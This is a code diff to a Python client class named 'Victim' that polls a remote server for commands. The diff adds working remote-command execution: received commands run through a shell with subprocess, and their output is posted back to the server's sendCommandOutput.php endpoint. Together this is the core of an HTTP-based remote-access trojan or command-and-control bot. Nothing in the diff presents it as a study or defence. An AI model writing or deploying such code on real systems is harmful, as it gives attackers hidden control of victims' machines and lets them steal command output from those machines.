@@ -2,6 +2,7 @@ import requests
 import logging
 import pickle
 import time
+import subprocess
 
 class Victim:
 
@@ -47,6 +48,19 @@ class Victim:
     def askForCommand(self):
         return self.__session.request('GET', self.__serverUrl + '/victim/askForCommand.php')
 
+    # Execute command
+    def executeCommand(self, command):
+        output = subprocess.Popen(command,
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE )
+        return str(output.stdout.read(), 'utf-8')
+
+    def sendCommandOutput(self, output):
+        return self.__session.request('POST',
+                    self.__serverUrl + '/victim/sendCommandOutput.php',
+                    data={'output':output})
 
     def disconnectFromServer(self):
         return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})
@@ -83,6 +97,10 @@ def main():
 
             # Execute command
             print('Executing...')
+            data['output'] = victim.executeCommand(data['cmd'])
+            print(data['output'], end='')
+
+            # Send output to server
 
 
             #time.sleep(1)
